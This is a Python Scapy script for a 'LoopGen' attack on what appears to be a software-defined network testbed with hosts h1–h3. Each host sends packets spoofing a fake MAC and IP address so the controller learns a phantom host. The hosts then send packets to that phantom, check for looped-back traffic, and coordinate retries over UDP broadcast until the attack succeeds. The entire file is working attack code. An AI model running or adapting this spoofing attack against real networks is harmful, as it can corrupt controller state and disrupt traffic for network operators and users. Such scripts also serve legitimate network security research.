#!/usr/bin/env python3
"""
LoopGen synchronized attack (optimized)
All hosts (h1, h2, h3) perform synchronized attack rounds.
Any host detecting failure broadcasts ATTACK_FAIL to synchronize retries.
"""

from scapy.all import *
from datetime import datetime
import time, socket, threading, json

# ======== CONFIGURATION ========
ROLE = "h2"           # change manually: "h1" / "h2" / "h3"
IFACE = f"{ROLE}-eth0"
BROADCAST_PORT = 9999
FAKE_MAC = "00:00:00:00:00:08"
FAKE_IP = "10.0.0.8"

# real source/target pairs
HOST_MAP = {
    "h1": ("00:00:00:00:00:01", "10.0.0.1", "00:00:00:00:00:02", "10.0.0.2"),
    "h2": ("00:00:00:00:00:02", "10.0.0.2", "00:00:00:00:00:03", "10.0.0.3"),
    "h3": ("00:00:00:00:00:03", "10.0.0.3", "00:00:00:00:00:01", "10.0.0.1"),
}

SRC_MAC, SRC_IP, DST_MAC, DST_IP = HOST_MAP[ROLE]


# ======== UDP SYNC COMMUNICATION ========
def listen_for_fail(flag):
    """Listen for broadcasted failure notifications."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", BROADCAST_PORT))
    sock.settimeout(1)
    while not flag["stop"]:
        try:
            data, _ = sock.recvfrom(1024)
            msg = json.loads(data.decode())
            if msg.get("type") == "ATTACK_FAIL":
                flag["fail"] = True
        except socket.timeout:
            continue
    sock.close()


def broadcast_fail():
    """Broadcast a failure notification to the local network."""
    msg = json.dumps({"type": "ATTACK_FAIL"})
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(msg.encode(), ("10.0.0.255", BROADCAST_PORT))
    sock.close()


# ======== MAIN LOOP ========
def main():
    print(f"=== {ROLE} attack started ===")
    flag = {"stop": False, "fail": False}
    round_num = 1

    listener = threading.Thread(target=listen_for_fail, args=(flag,), daemon=True)
    listener.start()

    while True:
        flag["fail"] = False
        # schedule attack at each minute + 30s
        now = datetime.now()
        target_time = datetime(
            now.year, now.month, now.day,
            now.hour, now.minute + 1, 30
        ).timestamp()

        # wait silently until that moment
        while True:
            diff = target_time - time.time()
            if diff <= 0:
                break
            if diff > 1:
                time.sleep(0.8)
            else:
                time.sleep(diff)

        # ====== Phase 1: probe fake host ======
        pkt_probe = Ether(src=FAKE_MAC, dst=DST_MAC) / IP(src=FAKE_IP, dst=DST_IP) / UDP() / b"SYNC_PKT"
        sendp(pkt_probe, iface=IFACE, verbose=False)

        # small quiet wait for controller to process
        time.sleep(3.0)

        # ====== Phase 2: simultaneous attack ======
        pkt_attack = Ether(src=SRC_MAC, dst=FAKE_MAC) / IP(src=SRC_IP, dst=FAKE_IP) / UDP() / b"LOOPGEN_ATTACK"
        sendp(pkt_attack, iface=IFACE, verbose=False)

        # ====== Sniff detection ======
        packets = sniff(iface=IFACE, timeout=5,
                        lfilter=lambda p: Ether in p and p[Ether].dst == FAKE_MAC)

        # ====== Output after everything ======
        if packets:
            print(f"[{ROLE}] ❌ Received loopback packets -> round {round_num} failed")
            broadcast_fail()
            round_num += 1
            time.sleep(1)
        elif flag["fail"]:
            print(f"[{ROLE}] ⚠️ Peer reported failure -> synchronize next round")
            round_num += 1
            time.sleep(1)
        else:
            print(f"[{ROLE}] ✅ Attack succeeded in round {round_num}")
            break

    flag["stop"] = True
    print(f"=== {ROLE} attack finished ===")


if __name__ == "__main__":
    main()

